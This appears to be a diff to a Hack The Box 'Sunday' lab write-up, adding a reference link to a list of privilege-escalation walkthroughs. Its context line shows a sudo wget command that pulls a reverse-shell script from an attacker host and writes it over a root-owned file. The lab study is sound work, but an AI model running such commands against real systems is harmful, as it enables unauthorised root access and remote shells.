@@ -186,4 +186,4 @@ sudo wget http://10.10.14.8:8000/rev_shell.py -O /root/troll
 # References & Alternatives:
 + https://vvmlist.github.io/#poison
 + https://0xdf.gitlab.io/2018/09/29/htb-sunday.html#6-methods-to-root-using-wget
-+ 
++ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/sunday-writeup-w-o-metasploit#id-4d32
